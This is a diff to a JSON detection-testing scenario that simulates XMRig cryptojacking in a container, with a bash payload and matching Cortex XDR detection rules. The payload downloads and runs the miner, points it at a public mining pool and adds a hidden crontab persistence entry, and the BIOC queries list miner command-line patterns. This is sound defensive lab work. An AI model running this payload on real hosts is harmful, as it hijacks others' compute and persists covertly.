@@ -48,9 +48,9 @@
     }
   },
   "identity": {
-    "name": "Cryptominer Deployment \u2014 XMRig Resource Hijacking in Containers (T1496)",
-    "summary": "A compromised container tunes the host for mining (ulimit/sysctl/transparent-hugepage), downloads the XMRig binary into a hidden /tmp directory, writes a Monero pool config pointing at pool.minexmr.com, runs the miner from a low-privilege identity, and persists it via crontab. Cortex Cloud runtime defense and XDR container BIOCs flag the XMRig binary execution, the stratum pool config, the cron\u2026",
-    "description": "Cryptojacking is the most common monetization of compromised cloud workloads: Unit 42's large-scale Monero operation dropped XMRig into exposed containers and cloud hosts, tuned the kernel for hashing performance, connected to public mining pools, and re-launched the miner from cron to survive restarts. This scenario reproduces that kill chain from a non-root container identity \u2014 disabling resource limits and enabling huge pages, downloading the XMRig release tarball into /tmp/.xmr, writing a pool config targeting pool.minexmr.com:4444, executing the miner (capped at 30s for the lab), and installing a */5 crontab entry for persistence. The detection approach is container-context behavioral analysis plus content matching: Cortex flags the XMRig binary transfer, the known stratum pool string in the config, the crontab modification referencing the miner, and the sustained high-CPU process tree characteristic of mining. A correlation rule stitches the staging, execution, and persistence stages from one container into a single high-severity Impact incident.",
+    "name": "Cryptominer Deployment — XMRig Resource Hijacking in Containers (T1496)",
+    "summary": "A compromised container tunes the host for mining (ulimit/sysctl/transparent-hugepage), downloads the XMRig binary into a hidden /tmp directory, writes a Monero pool config pointing at pool.minexmr.com, runs the miner from a low-privilege identity, and persists it via crontab. Cortex Cloud runtime defense and XDR container BIOCs flag the XMRig binary execution, the stratum pool config, the cron…",
+    "description": "Cryptojacking is the most common monetization of compromised cloud workloads: Unit 42's large-scale Monero operation dropped XMRig into exposed containers and cloud hosts, tuned the kernel for hashing performance, connected to public mining pools, and re-launched the miner from cron to survive restarts. This scenario reproduces that kill chain from a non-root container identity — disabling resource limits and enabling huge pages, downloading the XMRig release tarball into /tmp/.xmr, writing a pool config targeting pool.minexmr.com:4444, executing the miner (capped at 30s for the lab), and installing a */5 crontab entry for persistence. The detection approach is container-context behavioral analysis plus content matching: Cortex flags the XMRig binary transfer, the known stratum pool string in the config, the crontab modification referencing the miner, and the sustained high-CPU process tree characteristic of mining. A correlation rule stitches the staging, execution, and persistence stages from one container into a single high-severity Impact incident.",
     "severity": "high",
     "confidence": "high"
   },
@@ -128,7 +128,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "atomic-red-team",
-    "framework_reference_id": "T1496 \u2014 XMRig deployment, stratum pool connection, and cron persistence inside a container.",
+    "framework_reference_id": "T1496 — XMRig deployment, stratum pool connection, and cron persistence inside a container.",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -136,12 +136,12 @@
         "check_command": "systemctl is-active cortex-agent || ps aux | grep -i defender"
       },
       {
-        "description": "Lab environment matching scenario SIM-CDR-002 \u2014 container with curl/tar available and outbound egress permitted (lab only)."
+        "description": "Lab environment matching scenario SIM-CDR-002 — container with curl/tar available and outbound egress permitted (lab only)."
       }
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# XMRig cryptominer deploy/execute/persist \u2014 capped runtime, simulation wallet only.\nulimit -n 65535 2>/dev/null; echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; mkdir -p /tmp/.xmr\ncurl -sSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -o /tmp/.xmr/xmrig.tar.gz && tar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && chmod +x /tmp/.xmr/xmrig\nprintf '{\"pools\":[{\"url\":\"pool.minexmr.com:4444\",\"user\":\"SIMULATION_WALLET_DO_NOT_USE\"}]}' > /tmp/.xmr/config.json\ntimeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color | head -50\n(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1') | crontab -",
+      "code": "# XMRig cryptominer deploy/execute/persist — capped runtime, simulation wallet only.\nulimit -n 65535 2>/dev/null; echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true; mkdir -p /tmp/.xmr\ncurl -sSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -o /tmp/.xmr/xmrig.tar.gz && tar -xzf /tmp/.xmr/xmrig.tar.gz -C /tmp/.xmr/ --strip-components=1 && chmod +x /tmp/.xmr/xmrig\nprintf '{\"pools\":[{\"url\":\"pool.minexmr.com:4444\",\"user\":\"SIMULATION_WALLET_DO_NOT_USE\"}]}' > /tmp/.xmr/config.json\ntimeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color | head -50\n(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1') | crontab -",
       "input_variables": [],
       "timeout_seconds": 120
     },
@@ -177,7 +177,7 @@
       {
         "ioc_type": "domain",
         "value": "pool.minexmr.com",
-        "context": "Public Monero mining pool referenced in the XMRig config \u2014 strong cryptojacking indicator.",
+        "context": "Public Monero mining pool referenced in the XMRig config — strong cryptojacking indicator.",
         "reputation_required": "any",
         "cortex_severity_override": "high"
       },
@@ -191,7 +191,7 @@
     "biocs": [
       {
         "name": "CDR-002 Container Resource Limit Tuning Pre-Mining",
-        "description": "System limit modification in container \u2014 ulimit/sysctl tuning consistent with cryptominer pre-deployment. A container process raises resource limits or enables huge pages to maximize hashing throughput.",
+        "description": "System limit modification in container — ulimit/sysctl tuning consistent with cryptominer pre-deployment. A container process raises resource limits or enables huge pages to maximize hashing throughput.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"sysctl\", \"ulimit\", \"bash\", \"sh\")\n| filter action_process_image_command_line contains_any (\"transparent_hugepage\", \"vm.nr_hugepages\", \"ulimit -n\", \"ulimit -u\")",
         "severity": "medium",
         "mitre_technique_ids": [
@@ -200,7 +200,7 @@
       },
       {
         "name": "CDR-002 XMRig Binary Download And Extraction In Container",
-        "description": "XMRig binary download and extraction \u2014 cryptominer tool transfer signature. A container process fetches the XMRig release tarball and extracts the miner binary.",
+        "description": "XMRig binary download and extraction — cryptominer tool transfer signature. A container process fetches the XMRig release tarball and extracts the miner binary.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"curl\", \"wget\", \"tar\")\n| filter action_process_image_command_line contains_any (\"xmrig\", \"xmrig-6\", \"linux-static\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -218,7 +218,7 @@
       },
       {
         "name": "CDR-002 Known Mining Pool In Config File In Container",
-        "description": "Known cryptomining pool domain/IP in config file \u2014 pool.minexmr.com association. A config file written in the container references a known public stratum mining pool.",
+        "description": "Known cryptomining pool domain/IP in config file — pool.minexmr.com association. A config file written in the container references a known public stratum mining pool.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter container_id != null\n| filter action_file_extension = \"json\"\n| filter action_file_path contains \"config\"\n| filter actor_process_image_name in (\"bash\", \"sh\", \"cat\", \"tee\", \"python3\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -227,7 +227,7 @@
       },
       {
         "name": "CDR-002 XMRig Process Execution In Container",
-        "description": "Cryptominer binary execution \u2014 XMRig process tree detected by CDR runtime BIOC. The xmrig binary launches inside a container, optionally with --config pointing at a pool.",
+        "description": "Cryptominer binary execution — XMRig process tree detected by CDR runtime BIOC. The xmrig binary launches inside a container, optionally with --config pointing at a pool.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name = \"xmrig\" or action_process_image_command_line contains_any (\"xmrig\", \"--config\", \"stratum+tcp\", \"--max-threads-hint\")\n| filter causality_actor_process_image_name in (\"bash\", \"sh\", \"runc\", \"containerd-shim\", \"cron\", \"crond\")\n| fields _time, container_id, actor_effective_username, causality_actor_process_image_name, causality_actor_process_instance_id, action_process_image_command_line",
         "severity": "critical",
         "mitre_technique_ids": [
@@ -245,7 +245,7 @@
       },
       {
         "name": "CDR-002 Crontab Modification To Persist Cryptominer In Container",
-        "description": "Crontab modification to persist cryptominer \u2014 scheduled task creation from container. crontab is invoked to install a recurring job that re-launches the miner.",
+        "description": "Crontab modification to persist cryptominer — scheduled task creation from container. crontab is invoked to install a recurring job that re-launches the miner.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name = \"crontab\"\n| filter causality_actor_process_image_name in (\"bash\", \"sh\", \"runc\", \"containerd-shim\")\n| filter action_process_image_command_line contains_any (\"xmrig\", \"-\", \"/tmp/.xmr\")\n| fields _time, container_id, actor_effective_username, causality_actor_process_image_name, causality_actor_process_instance_id, action_process_image_command_line",
         "severity": "high",
         "mitre_technique_ids": [
@@ -254,7 +254,7 @@
       },
       {
         "name": "CDR-002 Cryptominer Added To Cron Schedule In Container",
-        "description": "Cryptominer binary added to cron schedule \u2014 multi-stage malware persistence behavior. A cron spool/tab file is written that references the miner binary path.",
+        "description": "Cryptominer binary added to cron schedule — multi-stage malware persistence behavior. A cron spool/tab file is written that references the miner binary path.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter container_id != null\n| filter action_file_path contains_any (\"/var/spool/cron\", \"/etc/cron\", \"crontab\")\n| filter actor_process_image_name in (\"crontab\", \"bash\", \"sh\", \"tee\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -287,14 +287,14 @@
     ],
     "correlation_rules": [
       {
-        "name": "Cryptominer Deploy Execute Persist \u2014 Same Container",
+        "name": "Cryptominer Deploy Execute Persist — Same Container",
         "rule_id": "CR-CDR-0002",
         "logic": "BIOC(CDR-002 XMRig Binary Download And Extraction In Container) OR BIOC(CDR-002 Known Mining Pool In Config File In Container) OR BIOC(CDR-002 XMRig Process Execution In Container) OR BIOC(CDR-002 Sustained High CPU Mining Workload In Container) OR BIOC(CDR-002 Crontab Modification To Persist Cryptominer In Container) OR BIOC(CDR-002 Cryptominer Added To Cron Schedule In Container)"
       }
     ],
     "analytics_modules": [
-      "Cortex Cloud Runtime Defense \u2014 Cryptominer process and stratum pool detection",
-      "Cortex XDR Analytics \u2014 Sustained high-CPU container process with mining pool egress"
+      "Cortex Cloud Runtime Defense — Cryptominer process and stratum pool detection",
+      "Cortex XDR Analytics — Sustained high-CPU container process with mining pool egress"
     ]
   },
   "panw_mapping": {
@@ -339,14 +339,14 @@
         "evidence_query": "Correlation CR-CDR-0002 fuses XMRig staging, pool config, execution, high-CPU, and cron persistence from one container into a single Impact incident."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-CLOUD-023",
-        "name": "Cryptomining Activity Detection \u2014 XMRig Kill Chain",
+        "threat_scenario_id": "TS-CLOUD-023",
+        "name": "Cryptomining Activity Detection — XMRig Kill Chain",
         "description": "Detect and stitch the XMRig deploy-execute-persist cryptojacking chain inside a compromised container.",
-        "test_cases": [
+        "threat_steps": [
           {
-            "test_case_id": "TC-CLOUD-023A",
+            "threat_step_id": "TS-CLOUD-023A",
             "objective": "XMRig execution and mining-pool config fire their Cortex container BIOCs.",
             "preconditions": [
               "Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.",
@@ -364,7 +364,7 @@
             "expected_score_weight": 0.6
           },
           {
-            "test_case_id": "TC-CLOUD-023B",
+            "threat_step_id": "TS-CLOUD-023B",
             "objective": "Deploy/execute/persist stages stitch into one Impact incident.",
             "success_criteria": [
               "Correlation `CR-CDR-0002` groups the stages from one container_id into one incident.",
@@ -399,7 +399,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1496 \u2014 Resource Hijacking",
+      "title": "MITRE ATT&CK T1496 — Resource Hijacking",
       "url": "https://attack.mitre.org/techniques/T1496/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
